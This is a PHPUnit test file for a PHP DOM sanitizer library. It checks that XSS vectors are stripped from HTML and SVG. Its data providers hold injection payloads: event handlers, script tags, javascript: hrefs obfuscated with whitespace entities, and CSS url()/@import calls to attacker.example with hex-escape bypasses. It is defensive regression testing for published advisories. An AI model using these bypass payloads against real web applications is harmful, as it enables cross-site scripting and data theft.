<?php declare(strict_types=1);

namespace Rhukster\DomSanitizer;

use PHPUnit\Framework\TestCase;

final class DomSanitizerTest extends TestCase
{
    public function testDomSanitizerInstance(): void
    {
        $instance = new DOMSanitizer();
        $this->assertInstanceOf(
            DomSanitizer::class,
            $instance
        );
    }

    public function testCompromisedHTML(): void
    {
        $bad_html = file_get_contents('./tests/bad_full.html');
        $good_html = file_get_contents('./tests/good_full.html');
        $sanitizer = new DOMSanitizer(DOMSanitizer::HTML);

        $cleaned = $sanitizer->sanitize($bad_html, [
            'remove-html-tags' => false,
        ]);

        $this->assertEqualHtml(
            $good_html,
            $cleaned
        );
    }

    public function testHTMLSnippet(): void
    {
        $sanitizer = new DOMSanitizer();

        $input = '<div><p class="foo" onclick="alert(\'danger\');">bar</p><script>alert(\'more danger\')</script></div>';
        $expected = '<div><p class="foo">bar</p></div>';

        $this->assertEqualHTML(
            $expected,
            $sanitizer->sanitize($input)
        );
    }

    public function testCompromisedSVG(): void
    {
        $bad_svg = file_get_contents('./tests/bad.svg');
        $good_svg = file_get_contents('./tests/good.svg');
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);

        $output = $sanitizer->sanitize($bad_svg,  [
            'compress-output' => false
        ]);

        $this->assertEqualHtml(
            $good_svg,
            $output
        );
    }

    public function testGoodMathML(): void{
        $input = $expected = file_get_contents('./tests/mathml-sample.xml');
        $sanitizer = new DOMSanitizer(DOMSanitizer::MATHML);

        $this->assertEqualHTML(
            $expected,
            $sanitizer->sanitize($input)
        );
    }

    public function testCustomTags(): void
    {
        $sanitizer = new DOMSanitizer();

        $input = '<div><foo>testing</foo></div>';
        $expected = '<div></div>';

        $this->assertEqualHTML(
            $expected,
            $sanitizer->sanitize($input)
        );

        $expected2 = '<div><foo>testing</foo></div>';
        $sanitizer->addAllowedTags(['foo']);

        $this->assertEqualHTML(
            $expected2,
            $sanitizer->sanitize($input)
        );

        $expected3 = '<div></div>';
        $sanitizer->addDisallowedTags(['foo']);

        $this->assertEqualHTML(
            $expected3,
            $sanitizer->sanitize($input)
        );
    }

    public function testInvalidSVG(): void
    {
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);
        $this->assertEquals(
            false,
            $sanitizer->sanitize('<foo></foo>')
        );
    }

    public function testCustomAttributes(): void
    {
        $sanitizer = new DOMSanitizer();

        $input = '<div><p blah="something">testing</p></div>';
        $expected = '<div><p>testing</p></div>';

        $this->assertEqualHTML(
            $expected,
            $sanitizer->sanitize($input)
        );

        $expected2 = '<div><p blah="something">testing</p></div>';
        $sanitizer->addAllowedAttributes(['blah']);

        $this->assertEqualHTML(
            $expected2,
            $sanitizer->sanitize($input)
        );

        $expected3 = '<div><p>testing</p></div>';
        $sanitizer->addDisallowedAttributes(['blah']);

        $this->assertEqualHTML(
            $expected3,
            $sanitizer->sanitize($input)
        );
    }

    public function testCaseSensitivity(): void{
        $bad_svg = file_get_contents('./tests/cartman.svg');
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);

        $this->assertStringContainsString(
            'viewBox',
            $sanitizer->sanitize($bad_svg, [
                'compress-output' => false
            ])
        );
    }

    public function testXss(): void {
        $bad_svg = file_get_contents('./tests/xss.svg');
        $good_svg = file_get_contents('./tests/xss_expected.svg');
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);

        $output = $sanitizer->sanitize($bad_svg,  [
            'compress-output' => false
        ]);

        $this->assertEqualHtml(
            $good_svg,
            $output
        );
    }

    public function testXlinkHRef(): void {
        $bad_svg = file_get_contents(__DIR__ . '/xlink.svg');
        $good_svg = file_get_contents(__DIR__ . '/xlink_expected.svg');
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);
        $sanitizer->addDisallowedAttributes(['xlink:href']);

        $output = $sanitizer->sanitize($bad_svg,  [
            'compress-output' => false
        ]);

        $this->assertEqualHtml(
            $good_svg,
            $output
        );
    }

    // =========================================================================
    // GHSA-gxwg-x2jg-q44j: Stored XSS via SVG Event Handlers
    // Tests for event handler attributes that should be stripped
    // =========================================================================

    /**
     * @dataProvider providerSvgEventHandlers
     */
    public function testSvgEventHandlersStripped(string $input, string $expected, string $description): void
    {
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);
        $output = $sanitizer->sanitize($input);

        $this->assertEqualHtml($expected, $output, "Failed: $description");
    }

    public static function providerSvgEventHandlers(): array
    {
        return [
            // GHSA-gxwg-x2jg-q44j PoC vectors
            [
                '<svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"/>',
                'SVG onload attribute should be stripped'
            ],
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(1)" attributeName="x" dur="1s"></animate></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"/>',
                'animate tag should be removed entirely (disallowed tag)'
            ],
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><set onbegin="alert(1)" attributeName="x"></set></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"/>',
                'set tag should be removed entirely (disallowed tag)'
            ],

            // Common event handlers on allowed tags
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><rect onerror="alert(1)"/></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>',
                'onerror attribute should be stripped'
            ],
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><rect onmouseover="alert(1)"/></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>',
                'onmouseover attribute should be stripped'
            ],
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><rect onclick="alert(1)"/></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>',
                'onclick attribute should be stripped'
            ],
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><rect onfocus="alert(1)"/></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>',
                'onfocus attribute should be stripped'
            ],
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><rect onblur="alert(1)"/></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>',
                'onblur attribute should be stripped'
            ],

            // Multiple event handlers
            [
                '<svg onload="alert(1)" onclick="alert(2)" xmlns="http://www.w3.org/2000/svg"><rect onmouseover="alert(3)"/></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>',
                'Multiple event handlers should all be stripped'
            ],

            // Mixed with valid attributes
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><rect x="10" y="10" onload="alert(1)" width="100" height="100"/></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"><rect x="10" y="10" width="100" height="100"/></svg>',
                'Event handler stripped while valid attributes preserved'
            ],
        ];
    }

    /**
     * @dataProvider providerHtmlEventHandlers
     */
    public function testHtmlEventHandlersStripped(string $input, string $expected, string $description): void
    {
        $sanitizer = new DOMSanitizer(DOMSanitizer::HTML);
        $output = $sanitizer->sanitize($input);

        $this->assertEqualHtml($expected, $output, "Failed: $description");
    }

    public static function providerHtmlEventHandlers(): array
    {
        return [
            // GHSA-gxwg-x2jg-q44j PoC vectors (HTML context)
            [
                '<img src="x" onerror="alert(1)">',
                '<img src="x">',
                'img onerror should be stripped'
            ],
            [
                '<video src="x" onerror="alert(1)"></video>',
                '<video src="x"></video>',
                'video onerror should be stripped'
            ],
            [
                '<audio src="x" onerror="alert(1)"></audio>',
                '<audio src="x"></audio>',
                'audio onerror should be stripped'
            ],
            [
                '<div onload="alert(1)">test</div>',
                '<div>test</div>',
                'div onload should be stripped'
            ],
            [
                '<div onmouseover="alert(1)">test</div>',
                '<div>test</div>',
                'div onmouseover should be stripped'
            ],
            [
                '<a href="#" onclick="alert(1)">link</a>',
                '<a href="#">link</a>',
                'anchor onclick should be stripped'
            ],
            [
                '<input onfocus="alert(1)" type="text">',
                '<input type="text">',
                'input onfocus should be stripped'
            ],
            [
                '<form onsubmit="alert(1)"></form>',
                '<form></form>',
                'form onsubmit should be stripped'
            ],

            // Script tags should be removed entirely
            [
                '<div><script>alert(1)</script></div>',
                '<div></div>',
                'script tags should be removed'
            ],
        ];
    }

    /**
     * Test that disallowed SVG tags are completely removed
     */
    public function testDisallowedSvgTags(): void
    {
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);

        $disallowedTags = ['animate', 'set', 'script', 'foreignobject', 'use'];

        foreach ($disallowedTags as $tag) {
            $input = "<svg xmlns=\"http://www.w3.org/2000/svg\"><{$tag}></{$tag}></svg>";
            $output = $sanitizer->sanitize($input);

            $this->assertStringNotContainsString(
                "<{$tag}",
                strtolower($output),
                "Disallowed tag '{$tag}' should be removed"
            );
        }
    }

    // =========================================================================
    // Issue #5: SVG filter elements incorrectly removed due to camelCase
    // =========================================================================

    public function testSvgFiltersPreserved(): void
    {
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);

        $input = '<svg xmlns="http://www.w3.org/2000/svg"><defs><filter id="blur"><feGaussianBlur stdDeviation="5"/></filter></defs><rect filter="url(#blur)" x="0" y="0" width="100" height="100"/></svg>';
        $output = $sanitizer->sanitize($input, ['compress-output' => false]);

        $this->assertStringContainsString(
            'feGaussianBlur',
            $output,
            'SVG filter elements like feGaussianBlur should be preserved'
        );
    }

    /**
     * @dataProvider providerSvgFilterTags
     */
    public function testSvgFilterTagsAllowed(string $tag, string $description): void
    {
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);

        $input = "<svg xmlns=\"http://www.w3.org/2000/svg\"><defs><filter id=\"f\"><{$tag}/></filter></defs></svg>";
        $output = $sanitizer->sanitize($input, ['compress-output' => false]);

        $this->assertStringContainsString(
            $tag,
            $output,
            "SVG filter tag '{$tag}' should be allowed: $description"
        );
    }

    public static function providerSvgFilterTags(): array
    {
        return [
            ['feGaussianBlur', 'Gaussian blur filter'],
            ['feBlend', 'Blend filter'],
            ['feColorMatrix', 'Color matrix filter'],
            ['feOffset', 'Offset filter'],
            ['feMerge', 'Merge filter'],
            ['feMergeNode', 'Merge node filter'],
            ['feFlood', 'Flood filter'],
            ['feComposite', 'Composite filter'],
        ];
    }

    // =========================================================================
    // Issue #6: SVG Sanitizer Bypass via ASCII Whitespace Entities
    // (CVE-2026-33172 fix bypass)
    // =========================================================================

    /**
     * @dataProvider providerWhitespaceEntityBypass
     */
    public function testWhitespaceEntityBypassBlocked(string $input, string $description): void
    {
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);
        $output = $sanitizer->sanitize($input);

        $this->assertStringNotContainsString(
            'javascript',
            strtolower(preg_replace('/[\x00-\x20]+/', '', $output)),
            "Failed: $description"
        );
    }

    public static function providerWhitespaceEntityBypass(): array
    {
        return [
            // Tab bypass
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><a href="java&#x09;script:alert(1)"><text>Click</text></a></svg>',
                'href with tab entity (&#x09;) in javascript: should be stripped'
            ],
            // Newline bypass
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><a href="java&#x0a;script:alert(2)"><text>Click</text></a></svg>',
                'href with newline entity (&#x0a;) in javascript: should be stripped'
            ],
            // Carriage return bypass
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><a href="java&#x0d;script:alert(3)"><text>Click</text></a></svg>',
                'href with CR entity (&#x0d;) in javascript: should be stripped'
            ],
            // Leading tab bypass
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><a href="&#x09;javascript:alert(4)"><text>Click</text></a></svg>',
                'href with leading tab entity before javascript: should be stripped'
            ],
            // xlink:href bypass
            [
                '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="java&#x09;script:alert(5)"><text>Click</text></a></svg>',
                'xlink:href with tab entity in javascript: should be stripped'
            ],
            // Multiple whitespace characters
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><a href="j&#x09;a&#x0a;v&#x0d;ascript:alert(6)"><text>Click</text></a></svg>',
                'href with multiple whitespace entities scattered in javascript: should be stripped'
            ],
            // Null byte bypass attempt
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><a href="java&#x00;script:alert(7)"><text>Click</text></a></svg>',
                'href with null byte entity in javascript: should be stripped'
            ],
        ];
    }

    // =========================================================================
    // GHSA-93vf-569f-22cq: CSS injection via <style> text content
    // =========================================================================

    /**
     * @dataProvider providerDangerousStyleContent
     */
    public function testDangerousStyleContentStripped(int $mode, string $input, string $description): void
    {
        $sanitizer = new DOMSanitizer($mode);
        $output = $sanitizer->sanitize($input);

        $this->assertStringNotContainsString('attacker.example', $output, "Failed: $description");
        $this->assertStringNotContainsString('evil.example', $output, "Failed: $description");
        $this->assertStringNotContainsString('@import', $output, "Failed: $description");
    }

    public static function providerDangerousStyleContent(): array
    {
        return [
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><style>* { background: url("https://attacker.example/c"); }</style></svg>',
                'SVG <style> with quoted external url() should be dropped',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><style>* { background: url(https://attacker.example/c); }</style></svg>',
                'SVG <style> with unquoted external url() should be dropped',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><style>@import url(https://attacker.example/evil.css);</style></svg>',
                'SVG <style> with @import url() should be dropped',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><style>@import "https://attacker.example/evil.css";</style></svg>',
                'SVG <style> with quoted @import should be dropped',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><style>body { background: url(//evil.example/x); }</style></svg>',
                'SVG <style> with protocol-relative url() should be dropped',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><style>* { background: \75 rl(https://attacker.example/x); }</style></svg>',
                'SVG <style> with CSS hex-escape bypass should be dropped',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><style>\40 import url(https://evil.example/e.css);</style></svg>',
                'SVG <style> with CSS hex-escaped @import should be dropped',
            ],
            [
                DOMSanitizer::HTML,
                '<div><style>body { background: url(https://attacker.example/x); }</style></div>',
                'HTML <style> with external url() should be dropped',
            ],
        ];
    }

    /**
     * Legitimate <style> content must survive sanitization, including
     * fragment-only url(#id) references used by SVG defs/gradients/filters.
     */
    public function testLegitimateStyleContentPreserved(): void
    {
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);

        $fragment = '<svg xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="g"/></defs><style>.cls { fill: url(#g); stroke: #000; }</style><rect class="cls"/></svg>';
        $output = $sanitizer->sanitize($fragment);
        $this->assertStringContainsString('<style>', $output, 'Fragment url(#id) style block must be preserved');
        $this->assertStringContainsString('url(#g)', $output, 'Fragment reference must be preserved');

        $plain = '<svg xmlns="http://www.w3.org/2000/svg"><style>.a { fill: red; stroke: #00f; font-family: sans-serif; }</style><rect class="a"/></svg>';
        $output = $sanitizer->sanitize($plain);
        $this->assertStringContainsString('<style>', $output, 'Plain style rules must be preserved');
        $this->assertStringContainsString('fill: red', $output, 'Plain style rules must be preserved');

        $htmlSanitizer = new DOMSanitizer(DOMSanitizer::HTML);
        $html = '<div><style>.foo { color: red; }</style><p>ok</p></div>';
        $output = $htmlSanitizer->sanitize($html);
        $this->assertStringContainsString('<style>', $output, 'HTML plain style rules must be preserved');
        $this->assertStringContainsString('color: red', $output, 'HTML plain style rules must be preserved');
    }

    protected function assertEqualHtml($expected, $actual, $message = '')
    {
        $from = ['/\>[^\S ]+/s', '/[^\S ]+\</s', '/(\s)+/s', '/> </s'];
        $to   = ['>', '<', '\\1', '><'];
        $this->assertEquals(
            preg_replace($from, $to, $expected),
            preg_replace($from, $to, $actual)
        );
    }
}